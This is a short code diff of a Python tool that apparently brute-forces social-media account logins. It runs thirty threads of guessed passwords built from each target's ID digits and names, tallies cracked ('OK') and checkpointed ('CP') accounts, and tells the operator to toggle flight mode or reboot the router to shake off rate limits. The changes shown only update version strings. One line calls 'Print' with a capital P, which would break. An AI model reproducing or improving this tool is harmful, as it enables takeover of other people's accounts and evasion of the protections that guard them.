@@ -46,7 +46,7 @@ def startcrack():
     print(" the process has been started successfully")
     print(" use flightmode if you are using mobile data")
     print(" reboot your router if you are using wi-fi")
-    Print("Version - 0.2")
+    Print("Version - 0.3")
     print("-"*50)
     with ThreadPool(max_workers=30) as eman:
         passwordlist = [
@@ -65,7 +65,7 @@ def bgraph(userid,passwordlist,total_target):
     global loopcracked
     first6 = userid[0:6]
     try:
-        sys.stdout.write(f'\r\r[MARK-v0.1] {total_target}/{loopcracked} OK:-{green}{len(OK)}{white} - CP:-{red}{len(CP)}{white}\r\r')
+        sys.stdout.write(f'\r\r[MARK-v0.3] {total_target}/{loopcracked} OK:-{green}{len(OK)}{white} - CP:-{red}{len(CP)}{white}\r\r')
         sys.stdout.flush()
         for password in passwordlist:
             password = password.replace("first6digits",first6)
@@ -151,7 +151,7 @@ def bapi(userid,username,passwordlist,total_target):
     except ValueError:
         lastname = firstname
     try:
-        sys.stdout.write(f'\r\r[MARK-v0.1] {total_target}/{loopcracked} OK:-{green}{len(OK)}{white} - CP:-{red}{len(CP)}{white}\r\r')
+        sys.stdout.write(f'\r\r[MARK-v0.3] {total_target}/{loopcracked} OK:-{green}{len(OK)}{white} - CP:-{red}{len(CP)}{white}\r\r')
         sys.stdout.flush()
         for password in passwordlist:
             password = password.replace("first",firstname.lower()).replace("last",lastname.lower())
